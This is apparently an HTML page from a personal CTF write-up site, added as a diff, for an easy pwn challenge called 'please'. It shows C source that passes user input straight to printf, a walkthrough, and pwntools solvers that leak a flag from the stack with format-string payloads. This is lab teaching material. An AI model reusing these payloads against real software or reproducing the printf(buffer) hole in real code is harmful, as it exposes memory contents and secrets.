@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>please // Rogue_Net</title>
+    <meta name="description" content="## please ## Description Sometimes all you have to do is ask nicely... or exploit the binary&#39;s trust. Manipulate the input to satisfy conditions and t">
+    <link rel="stylesheet" href="../../../static/css/style.css">
+</head>
+<body>
+    <!-- Genjutsu Transition Overlay -->
+    <div class="genjutsu-overlay initial-closed" id="genjutsuOverlay">
+        <div class="eyelid eyelid-top"></div>
+        <div class="eyelid eyelid-bottom"></div>
+        <div class="genjutsu-eye">
+                <svg viewBox="0 0 200 200">
+                    <circle cx="100" cy="100" r="94" fill="var(--blood-red)" stroke="#000" stroke-width="10"/>
+                    <!-- Base 3-Tomoe -->
+                    <g class="base-sharingan" style="transform-origin: 100px 100px;">
+                        <circle cx="100" cy="100" r="90" fill="var(--blood-red)"/>
+                        <circle cx="100" cy="100" r="16" fill="#000"/>
+                        <circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/>
+                        <g class="tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(120deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(240deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                    </g>
+                    <!-- Uploaded Image Mangekyo -->
+                    <defs>
+                        <clipPath id="circleClip">
+                            <circle cx="100" cy="100" r="98" />
+                        </clipPath>
+                    </defs>
+                    <image href="../../../static/img/mangekyou.png" x="0" y="0" height="200" width="200" class="mangekyo" style="transform-origin: 100px 100px; opacity: 0; clip-path: url(#circleClip);" />
+                </svg>
+        </div>
+    </div>
+    <div class="scanlines"></div>
+    <div class="scroll-indicator" id="scrollIndicator"></div>
+    <div class="scroll-addr" id="scrollAddr">0x00000000</div>
+    <div class="pwndbg-bg" id="pwndbgBg"></div>
+
+    <div class="container" style="gap: 40px;">
+
+        <a href="../../../index.html" class="back-link">← pwndbg> back</a>
+
+        <div class="chall-header">
+            <h1><span class="prefix">./</span>please<span class="cursor-blink">_</span></h1>
+            <div class="chall-meta-row">
+                <span class="tag">PWN</span>
+                <span>FST Bootcamp</span>
+                <span>0x6050ce63</span>
+                
+                
+                <span>
+                    <span class="difficulty">
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                    </span>
+                </span>
+            </div>
+        </div>
+
+        <!-- Description -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DESCRIPTION</div>
+            <div class="code-block">
+                ## please ## Description Sometimes all you have to do is ask nicely... or exploit the binary&#39;s trust. Manipulate the input to satisfy conditions and trick the program into giving you what you want.
+            </div>
+        </div>
+
+        
+        <!-- Source Code / Disasm -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DISASM // SOURCE</div>
+            
+            <div style="color: var(--amber); margin-bottom: 8px; font-size: 0.9rem;">// please.c</div>
+            <div class="code-block" style="max-height: 500px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+
+int main(void)
+{
+  char buffer[0x200];
+  char flag[0x200];
+
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  setbuf(stderr, NULL);
+
+  memset(buffer, 0, sizeof(buffer));
+  memset(flag, 0, sizeof(flag));
+
+  int fd = open(&#34;flag.txt&#34;, O_RDONLY);
+  if (fd == -1) {
+    puts(&#34;failed to read flag. please contact an admin if this is remote&#34;);
+    exit(1);
+  }
+
+  read(fd, flag, sizeof(flag));
+  close(fd);
+
+  puts(&#34;what do you say?&#34;);
+
+  read(0, buffer, sizeof(buffer) - 1);
+  buffer[strcspn(buffer, &#34;\n&#34;)] = 0;
+
+  if (!strncmp(buffer, &#34;please&#34;, 6)) {
+    printf(buffer);
+    puts(&#34; to you too!&#34;);
+  }
+}
+</pre>
+            </div>
+            
+        </div>
+        
+
+        
+        <!-- Writeup -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">WRITEUP // WALKTHROUGH</div>
+            <div class="writeup-content">
+                <h1>Please — Writeup</h1>
+<h2>Challenge Overview</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>PWN</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>Easy</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td>R3t0x</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Format String — Stack Data Leak</td>
+</tr>
+</tbody>
+</table>
+<h2>Reconnaissance</h2>
+<p>The binary reads the flag into a stack variable, then asks for user input. If input starts with "please", it passes the buffer to <code>printf()</code> as a format string:</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">char</span><span class="w"> </span><span class="n">flag</span><span class="p">[</span><span class="mh">0x200</span><span class="p">];</span>
+<span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">flag</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">));</span><span class="w">  </span><span class="c1">// flag is on the stack!</span>
+<span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="w">  </span><span class="c1">// format string vuln</span>
+</code></pre></div>
+
+<h2>Strategy</h2>
+<p>Since the flag is on the stack and we control a format string, we use <code>%p</code> specifiers to leak stack contents. The flag bytes are stored as stack values that we can read with <code>%N$p</code> notation.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;please&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;.%p&#39;</span> <span class="o">*</span> <span class="mi">40</span>
+</code></pre></div>
+
+<h2>Exploit</h2>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;35.159.81.154&#39;</span><span class="p">,</span> <span class="mi">7001</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;please&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;.%p&#39;</span> <span class="o">*</span> <span class="mi">40</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+<span class="c1"># Parse hex values, convert to ASCII</span>
+</code></pre></div>
+
+<h2>Result</h2>
+<div class="codehilite"><pre><span></span><code>please.0x7fffffffdc90.0x200.(nil).0x4654537b...
+<span class="gh">#</span> Decode hex → FST{pl34s3_d0nt_pr1ntf_us3r_1nput}
+</code></pre></div>
+            </div>
+        </div>
+        
+
+        
+        <!-- Exploit / Solver -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">EXECUTION // EXPLOIT</div>
+            <div style="color: var(--text-muted); margin-bottom: 10px; font-size: 0.85rem;">
+                <span style="color: var(--gdb-green);">$</span> python3 solve.py
+            </div>
+            <div class="code-block" style="max-height: 600px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">#!/usr/bin/env python3
+from pwn import *
+
+# Your binary is called &#34;main&#34;, not &#34;./bin/please&#34;
+p = process(&#34;./main&#34;)          # &lt;-- THIS IS THE ONLY LINE YOU NEED TO CHANGE
+
+pay = &#34;please;&#34;
+cnt = 5
+
+for i in range(cnt):
+    pay += &#34;%&#34; + str(0x200 // 8 + 6 + i) + &#34;$llx;&#34;
+
+p.sendlineafter(b&#34;what do you say?\n&#34;, pay.encode())
+
+p.recvuntil(b&#34;;&#34;)                      # skip the &#34;please;&#34;
+
+leak = b&#34;&#34;
+for i in range(cnt):
+    hex_str = p.recvuntil(b&#34;;&#34;, drop=True)
+    leak += p64(int(hex_str, 16))
+
+print(&#34;[+] Leaked raw bytes:&#34;)
+print(leak)
+
+print(&#34;\n[+] Flag:&#34;)
+print(leak.split(b&#39;\x00&#39;)[0].decode())   # clean output, removes null padding
+p.close()
+</pre>
+            </div>
+        </div>
+        
+
+        <div style="height: 80px;"></div>
+    </div>
+
+    <script src="../../../static/js/main.js"></script>
+</body>
+</html>
